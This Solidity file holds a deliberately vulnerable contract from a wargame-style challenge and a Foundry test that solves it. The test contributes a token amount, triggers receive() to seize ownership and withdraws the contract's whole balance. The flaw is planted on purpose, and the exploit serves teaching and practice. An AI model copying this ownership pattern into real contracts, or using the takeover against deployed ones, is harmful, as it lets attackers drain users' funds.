// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

contract FallbackChallenge {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}

contract FallbackSolution is Test {
    FallbackChallenge fallbackContract;
    address player = makeAddr("player");

    function setUp() public {
        // Deploy the Fallback contract
        fallbackContract = new FallbackChallenge();
        
        // Set the player as the active address
        vm.deal(player, 1 ether);
        vm.startPrank(player);
    }

    function testSolution() public {
        // Initial state
        console.log("Initial owner:", fallbackContract.owner());
        console.log("Initial player contribution:", fallbackContract.getContribution());
        
        // Step 1: Contribute a small amount to get listed in contributions
        console.log("Step 1: Contributing to get a foothold...");
        fallbackContract.contribute{value: 0.0001 ether}();
        console.log("New player contribution:", fallbackContract.getContribution());
        
        // Step 2: Trigger the receive function to become owner
        console.log("Step 2: Triggering receive function...");
        (bool success,) = address(fallbackContract).call{value: 0.0001 ether}("");
        require(success, "Receive call failed");
        
        // Step 3: Verify player is now the owner
        console.log("New owner:", fallbackContract.owner());
        assertEq(fallbackContract.owner(), player);
        
        // Step 4: Withdraw all funds
        console.log("Step 4: Withdrawing all funds...");
        uint256 contractBalance = address(fallbackContract).balance;
        console.log("Contract balance before withdraw:", contractBalance);
        fallbackContract.withdraw();
        
        // Step 5: Verify the contract balance is 0
        uint256 finalBalance = address(fallbackContract).balance;
        console.log("Contract final balance:", finalBalance);
        assertEq(finalBalance, 0);
    }
} 